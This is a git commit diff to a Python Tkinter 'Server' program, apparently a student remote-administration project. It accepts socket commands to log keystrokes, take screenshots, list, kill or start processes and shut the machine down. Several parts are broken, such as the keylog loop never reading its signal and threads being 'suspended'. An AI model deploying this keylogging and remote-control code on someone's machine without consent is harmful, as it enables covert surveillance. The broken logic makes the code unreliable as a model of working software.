cfa036aba700abbfbe19703df56bf5f7bd15c1c8
chowsonice <56868942+chowsonice@users.noreply.github.com>
2023-08-17 05:59:28 -0700

    Update server

--- server/server/server.py
+++ server/server/server.py
@@ -4,16 +4,17 @@ import sys
 import winreg
 import subprocess
 import io
-
+import threading
+from mss import mss
+import psutil
 import tkinter as tk
 from tkinter import messagebox
-from threading import Thread
 from Keylog import InterceptKeys
 from Program import Program
 
 class Server(tk.Tk):
     def __init__(self):
-        tk.Tk.__init__(self)
+        super().__init__()
 
         self.title("Server")
         self.geometry("300x200")
@@ -37,12 +38,12 @@ class Server(tk.Tk):
         print("IP Address:", ip_address)
 
         Program.client, addr = Program.server.accept()
-        Program.ns = Program.client.makefile('rw')
+        Program.ns = Program.client.makefile('rwb')
 
-        print("Client connected at: ", addr)
+        print("Client connected at:", addr)
 
-        Program.nr = Program.ns.make_reader()
-        Program.nw = Program.ns.make_writer()
+        Program.nr = io.TextIOWrapper(Program.ns, encoding='utf-8')
+        Program.nw = io.TextIOWrapper(Program.ns, encoding='utf-8')
 
         self.start_button.config(state=tk.DISABLED)
         self.stop_button.config(state=tk.NORMAL)
@@ -61,192 +62,174 @@ class Server(tk.Tk):
 
     def receive_data(self):
         try:
+            print('Receiving data...')
             data = Program.nr.readline()
-            return data
-        except:
+            print('Received '+data)
+            return data.rstrip('\r\n')
+        except Exception as e:
+            print('Error while receiving data:', str(e))
             return "QUIT"
 
-    def handle_data(self, data):
-        Program.ns = Program.client.makefile('rw')
-        Program.nr = Program.ns.makefile('r')
-        Program.nw = Program.ns.makefile('w')
-        
+    def handle_data(self):
+        print('Handling data...')
         while True:
             data = self.receive_data()
-            
+            print(data)
             if data == "KEYLOG":
-                keylog()
+                self.keylog()
             elif data == "SHUTDOWN":
-                shutdown()
+                self.shutdown()
             elif data == "REGISTRY":
-                registry()
+                self.registry()
             elif data == "TAKEPIC":
-                takepic()
+                self.takepic()
             elif data == "PROCESS":
-                process()
+                self.process()
             elif data == "APPLICATION":
-                application()
+                self.application()
             elif data == "QUIT":
                 break
-        
+            else:
+                print('Unknown command: ', data);
+                break
+
         Program.client.shutdown(socket.SHUT_RDWR)
         Program.client.close()
         pass
 
     def on_closing(self):
         if messagebox.askokcancel("Quit", "Do you want to quit?"):
-            self.stop_server()
+            if (Program.client != None):
+                self.stop_server()
             self.destroy()
 
-def shutdown():
-    os.system("shutdown -s")
+    def shutdown(self):
+        subprocess.run("shutdown -s", shell=True)
 
-def hook_key(tklog):
-    tklog.resume()
-    with open(appstart.path, "w") as file:
-        file.write("")
+    def hook_key(self, tklog):
+        tklog.resume()
+        with open(appstart.path, "w") as file:
+            file.write("")
 
-def unhook(tklog):
-    tklog.suspend()
+    def unhook(self, tklog):
+        tklog.suspend()
 
-def print_keys():
-    s = ""
-    with open(appstart.path, "r") as file:
-        s = file.read()
-    with open(appstart.path, "w") as file:
-        file.write("")
-    if s == "":
-        s = "\0"
-    Program.nw.write(s)
-    Program.nw.flush()
+    def print_keys(self):
+        s = ""
+        with open(appstart.path, "r") as file:
+            s = file.read()
+        with open(appstart.path, "w") as file:
+            file.write("")
+        if s == "":
+            s = "\0"
+        Program.nw.write(s)
+        Program.nw.flush()
 
-def keylog():
-    tklog = threading.Thread(target=InterceptKeys.startKLog)
-    s = ""
-    tklog.start()
-    tklog.suspend()
-    while True:
-        receive_signal(s)
-        if s == "PRINT":
-            print_keys()
-        elif s == "HOOK":
-            hook_key(tklog)
-        elif s == "UNHOOK":
-            unhook(tklog)
-        elif s == "QUIT":
-            return
+    def keylog(self):
+        tklog = threading.Thread(target=InterceptKeys.startKLog)
+        s = ""
+        tklog.start()
+        tklog.suspend()
+        while True:
+            self.receive_signal(s)
+            if s == "PRINT":
+                self.print_keys()
+            elif s == "HOOK":
+                self.hook_key(tklog)
+            elif s == "UNHOOK":
+                self.unhook(tklog)
+            elif s == "QUIT":
+                return
 
-def takepic():   
-    with mss() as sct:
-        img = sct.shot()
+    def takepic(self):
+        with mss() as sct:
+            img = sct.shot()
 
-    nw.write(str(len(img)))
-    Program.client.sendall(img)
-    pass
+        Program.nw.write(str(img)+'\n')
+        Program.nw.flush()
+        pass
 
-def process():
-    while True:
-        data = receive_signal()
+    def process(self):
+        while True:
+            data = self.receive_signal()
 
-        if data == "LIST":
-            for p in psutil.process_iter():
-                nw.write(str(p.name()) + '\n')
+            if data == "LIST":
+                for p in psutil.process_iter():
+                    Program.nw.write(str(p.name()) + '\n')
 
-        elif data == "KILL":
-            pid = int(nr.readline())
-            p = psutil.Process(pid)
-            p.kill()
-          
-        elif data == "QUIT":
-            break
+            elif data == "KILL":
+                pid = int(Program.nr.readline())
+                p = psutil.Process(pid)
+                p.kill()
+              
+            elif data == "QUIT":
+                break
 
-        else:
-            pass  
+            else:
+                pass  
 
-def application():
-    ss = ""
-    pr = []
-    while True:
-        receive_signal(ss)
-        if ss == "XEM":
-            u = ""
-            s = ""
-            pr = subprocess.Popen(['tasklist'], stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
-            soprocess = len(pr.splitlines()) - 3
-            u = str(soprocess)
-            Program.nw.write(u)
-            Program.nw.flush()
-            for line in pr.splitlines()[3:]:
-                p = line.split()[0].decode()
-                if p:
-                    u = "ok"
-                Program.nw.write(u)
-                Program.nw.flush()
-                if u == "ok":
-                    u = line.split()[0].decode()
-                    Program.nw.write(u)
-                    Program.nw.flush()
-                    u = line.split()[1].decode()
-                    Program.nw.write(u)
-                    Program.nw.flush()
-                    u = line.split()[2].decode()
-                    Program.nw.write(u)
-                    Program.nw.flush()
-
-        elif ss == "KILL":
-            test = True
-            while test:
-                receive_signal(ss)
-                if ss == "KILLID":
-                    u = Program.nr.readline()
-                    test2 = False
-                    if u != "":
-                        for line in pr.splitlines()[3:]:
-                            p = line.split()
-                            if len(p) > 1:
-                                pid = p[1].decode()
-                                if pid == u:
-                                    try:
-                                        subprocess.Popen(['taskkill', '/F', '/PID', pid], stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
-                                        Program.nw.write("Đã diệt chương trình")
-                                        Program.nw.flush()
-                                    except Exception as ex:
-                                        Program.nw.write("Lỗi")
-                                        Program.nw.flush()
-                                    test2 = True
-                        if not test2:
-                            Program.nw.write("Không tìm thấy chương trình")
-                            Program.nw.flush()
-                elif ss == "QUIT":
-                    test = False
-
-        elif ss == "START":
-            test = True
-            while test:
-                receive_signal(ss)
-                if ss == "STARTID":
-                    u = Program.nr.readline()
-                    if u != "":
-                        u += ".exe"
+    def application(self):
+        ss = ""
+        pr = []
+        while True:
+            ss = self.receive_signal()
+            print(ss)
+            if ss == "XEM":   
+                try:
+                    app_list = []
+                    for proc in psutil.process_iter(['pid', 'name']):
                         try:
-                            subprocess.Popen(u, shell=True)
-                            Program.nw.write("Chương trình đã được bật")
-                            Program.nw.flush()
-                        except Exception as ex:
-                            Program.nw.write("Lỗi")
-                            Program.nw.flush()
-                        break
-                    Program.nw.write("Lỗi")
+                            app = psutil.Process(proc.pid)
+                            app_name = app.name()  # Retrieve the application name
+                            num_threads = app.num_threads()  # Retrieve the number of threads associated with the application
+                            app_list.append((app_name, proc.pid, num_threads))
+                        except (psutil.AccessDenied, psutil.NoSuchProcess) as e:
+                            print("Error retrieving application information:", str(e))
+
+                    print("Number of running applications:", len(app_list))
+                    Program.nw.write(str(len(app_list))+'\n');
                     Program.nw.flush()
-                elif ss == "QUIT":
-                    test = False
+                    print("Application details:")
+                    for app_name, pid, num_threads in app_list:
+                        Program.nw.write(app_name + '\n')
+                        Program.nw.flush()
+                        Program.nw.write(str(pid) + '\n')  # Convert pid to string before writing
+                        Program.nw.flush()
+                        Program.nw.write(str(num_threads) + '\n')  # Convert num_threads to string before writing
+                        Program.nw.flush()
+                except Exception as e:
+                    messagebox.showerror("Error",f"Error retrieving application:{e}")
+            elif ss == "KILL":
+                try:
+                    pid = int(Program.nr.readline().strip())
+                    process = psutil.Process(pid)
+                    process.terminate()
+                    messagebox.showinfo("Success", "Application with PID {} has been terminated.".format(pid))
+                except psutil.NoSuchProcess:
+                    messagebox.showerror('Error', f'No such application:{pid}')
+                except Exception as e:
+                    messagebox.showerror('Error', f'Error terminating application:{e}')
+            elif ss == "START":
+                try:
+                    app_name = Program.nr.readline().strip()
+                    print(app_name)
+                    subprocess.Popen(app_name)
+                    messagebox.showinfo("Success",f"Started application: {app_name}")
+                except FileNotFoundError:
+                    print(f"Application '{app_name}' not found")
+                    messagebox.showerror("Error",f"Application '{app_name}' not found\n")
+                except Exception as e:
+                    print(f"Error occurred while starting application: {e}")
+                    messagebox.showerror("Error",f"Error occurred while starting application: {e}\n")
+            elif ss == "QUIT":
+                break
 
-        elif ss == "QUIT":
-            return
 
-def start_server():
-    app = Server();
-    app.mainloop();
+    def receive_signal(self):
+        signal = Program.nr.readline().strip()
+        return signal
+
 
 if __name__ == "__main__":
-    start_server()
+    server = Server()
+    server.mainloop()
